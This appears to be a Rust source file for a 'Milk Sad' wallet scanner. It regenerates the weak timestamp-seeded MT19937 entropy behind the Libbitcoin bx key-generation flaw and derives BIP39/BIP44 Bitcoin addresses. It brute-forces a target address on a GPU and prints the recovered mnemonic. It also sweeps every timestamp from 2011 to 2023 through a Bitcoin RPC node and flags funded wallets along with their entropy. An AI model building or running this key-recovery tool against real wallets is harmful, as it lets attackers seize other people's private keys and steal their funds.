#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
#[cfg(feature = "gpu")]
use bip39::Mnemonic;
#[cfg(feature = "gpu")]
use bitcoin::bip32::{DerivationPath, Xpriv};
#[cfg(feature = "gpu")]
use bitcoin::secp256k1::Secp256k1;
#[cfg(feature = "gpu")]
use bitcoin::{Address, Network};
#[cfg(feature = "gpu")]
use rand_mt::Mt19937GenRand32;
#[cfg(feature = "gpu")]
use std::str::FromStr;
use tracing::{info, warn, error};
use bitcoincore_rpc::{Client, RpcApi, Auth};

/// Unified Milk Sad Scanner Entry Point
pub fn run_scan(
    target: Option<String>,
    start_ts_opt: Option<u32>,
    end_ts_opt: Option<u32>,
    multipath: bool,
    rpc_config: Option<(String, String, String)>,
) -> Result<()> {
    info!("Milk Sad Vulnerability Scanner (GPU-Accelerated)");
    
    // Time range: Default to 2011-2023
    let start_ts = start_ts_opt.unwrap_or(1293840000u32); 
    let end_ts = end_ts_opt.unwrap_or(1690848000u32);

    // Setup RPC if config provided
    let rpc_client = if let Some((url, user, pass)) = rpc_config {
        info!("RPC Enabled: Connecting to {}...", url);
        Some(Client::new(&url, Auth::UserPass(user, pass))?)
    } else {
        None
    };

    if target.is_none() && rpc_client.is_none() {
        error!("Usage Error: You must provide EITHER a --target address OR --rpc-url/user/pass to scan for funds.");
        return Err(anyhow::anyhow!("Missing target or RPC config"));
    }

    match target {
        Some(t) => run_with_target(&t, start_ts, end_ts, multipath),
        None => run_rpc_scan(start_ts, end_ts, multipath, rpc_client.unwrap())
    }
}

/// Legacy Target Mode (Checks against specific address hash)
fn run_with_target(
    target: &str,
    start_ts: u32,
    end_ts: u32,
    multipath: bool,
) -> Result<()> {
    info!("Milk Sad Vulnerability Scanner (100% GPU)");
    if multipath {
        info!("Mode: Multi-Path (Checking 30 addresses per timestamp)");
    } else {
        info!("Mode: Single-Path (Checking m/44'/0'/0'/0/0 only)");
    }
    info!("Target Address: {}", target);

    use bitcoin::Address; // v0.32: Address is at bitcoin::Address
    use std::str::FromStr;
    // Parse address - v0.32 returns Address<NetworkUnchecked>
    let address = Address::from_str(&target)?.assume_checked();
    let script = address.script_pubkey();
    if !script.is_p2pkh() {
        warn!("Warning: Not a P2PKH address, skipping.");
        return Ok(());
    }
    let target_hash160_slice = &script.as_bytes()[3..23];
    let mut target_hash160: [u8; 20] = [0; 20];
    target_hash160.copy_from_slice(target_hash160_slice);

    info!("Target Hash160: {}", hex::encode(&target_hash160));

    info!(
        "Scanning timestamps {} to {} ({} seconds)...",
        start_ts,
        end_ts,
        end_ts - start_ts
    );

    #[cfg(not(feature = "gpu"))]
    {
        warn!("This scanner requires GPU acceleration. Please recompile with --features gpu");
        return Err(anyhow::anyhow!("GPU feature disabled"));
    }

    #[cfg(feature = "gpu")]
    {
        let start_time = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialized");

        if multipath {
            let results = solver.compute_milk_sad_crack_multipath(start_ts, end_ts, &target_hash160)?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for (timestamp, addr_idx) in results {
                    // Verify on CPU
                    let entropy = generate_milk_sad_entropy(timestamp);
                    let derived_address = generate_address_from_entropy(&entropy, addr_idx);

                    if derived_address == target {
                        info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                        info!("Timestamp: {}", timestamp);
                        info!("Address Index: {}", addr_idx);
                        info!("Entropy: {}", hex::encode(&entropy));
                        info!(
                            "Mnemonic: {}",
                            Mnemonic::from_entropy(&entropy)
                                .expect("Valid entropy should produce valid mnemonic")
                        );
                    } else {
                        info!(
                            "[FALSE POSITIVE] Timestamp {} (Index {}) -> {}",
                            timestamp, addr_idx, derived_address
                        );
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        } else {
            let results = solver.compute_milk_sad_crack(start_ts, end_ts, &target_hash160)?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for timestamp in results {
                    // Verify on CPU (index 0)
                    let entropy = generate_milk_sad_entropy(timestamp as u32);
                    let derived_address = generate_address_from_entropy(&entropy, 0);

                    if derived_address == target {
                        info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                        info!("Timestamp: {}", timestamp);
                        info!("Entropy: {}", hex::encode(&entropy));
                        info!(
                            "Mnemonic: {}",
                            Mnemonic::from_entropy(&entropy)
                                .expect("Valid entropy should produce valid mnemonic")
                        );
                    } else {
                        info!(
                            "[FALSE POSITIVE] Timestamp {} -> {}",
                            timestamp, derived_address
                        );
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        }
        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
        Ok(())
    }
}

/// RPC Scan Mode (Generates addresses and checks balance)
/// Note: This is purely CPU based for now unless we implement bloom filter or fast RPC calls.
/// Because RPC is network bound, GPU generation is overkill if we serialize every address.
/// BUT: We can use GPU to generate seeds, then CPU to derive addresses and check.
/// Actually, implementing purely on CPU for RPC mode is acceptable given RPC latency (~10ms per call).
/// 10ms * 1M addresses = 10,000 seconds (3 hours). 
fn run_rpc_scan(start_ts: u32, end_ts: u32, multipath: bool, rpc: Client) -> Result<()> {
    info!("Mode: RPC Sweep (Checking balances for ALL derived addresses)");
    info!("Scanning {} timestamps...", end_ts - start_ts);
    
    let _start_time = std::time::Instant::now();
    let mut checked = 0;
    
    for t in start_ts..=end_ts {
        let entropy = generate_milk_sad_entropy(t);
        // Only check index 0 by default to save time, unless multipath
        let limit = if multipath { 5 } else { 1 }; 
        
        for i in 0..limit {
            let address_str = generate_address_from_entropy(&entropy, i);
            if let Ok(address) = Address::from_str(&address_str) {
                // Check balance
                // assume_checked is risky if address is invalid, but we generated it.
                // We use assume_checked() for bitcoincore-rpc compatibility? 
                // bitcoincore_rpc expects Address type.
                match rpc.get_received_by_address(&address.assume_checked(), Some(0)) {
                    Ok(balance) => {
                         if balance.to_sat() > 0 {
                             warn!("\n💰 FUNDED WALLET FOUND!");
                             warn!("Timestamp: {}", t);
                             warn!("Address: {}", address_str);
                             warn!("Total Received: {}", balance);
                             warn!("Entropy: {}", hex::encode(&entropy));
                         }
                    }
                    Err(_e) => {
                        // Rate limit or error?
                        // warn!("RPC Error: {}", e);
                    }
                }
            }
        }
        checked += 1;
        if checked % 100 == 0 {
             // info!("Checked {} timestamps...", checked);
        }
    }
    info!("RPC Scan complete.");
    Ok(())
}

/// Generate 128-bit entropy using MT19937 with MSB extraction
#[cfg(feature = "gpu")]
fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut entropy = [0u8; 16];
    for i in 0..4 {
        let val = rng.next_u32();
        entropy[i * 4] = ((val >> 24) & 0xFF) as u8;
        entropy[i * 4 + 1] = ((val >> 16) & 0xFF) as u8;
        entropy[i * 4 + 2] = ((val >> 8) & 0xFF) as u8;
        entropy[i * 4 + 3] = (val & 0xFF) as u8;
    }
    entropy
}

/// Generate Bitcoin address from entropy using BIP39/BIP44
#[cfg(feature = "gpu")]
fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
    let mnemonic = Mnemonic::from_entropy(entropy)
        .expect("Failed to create mnemonic from entropy - this should not happen with valid 16-byte entropy");
    let seed = mnemonic.to_seed("");

    let secp = Secp256k1::new();
    let root =
        Xpriv::new_master(Network::Bitcoin, &seed).expect("Failed to create master key from seed");

    // Path: m/44'/0'/0'/0/i
    let path_str = format!("m/44'/0'/0'/0/{}", addr_index);
    let path = DerivationPath::from_str(&path_str)
        .expect("Failed to parse derivation path - hardcoded path should be valid");
    let derived = root
        .derive_priv(&secp, &path)
        .expect("Failed to derive child key");

    let private_key = bitcoin::PrivateKey::new(derived.private_key, Network::Bitcoin);
    let pubkey = private_key.public_key(&secp);
    let address = Address::p2pkh(pubkey, Network::Bitcoin);

    address.to_string()
}
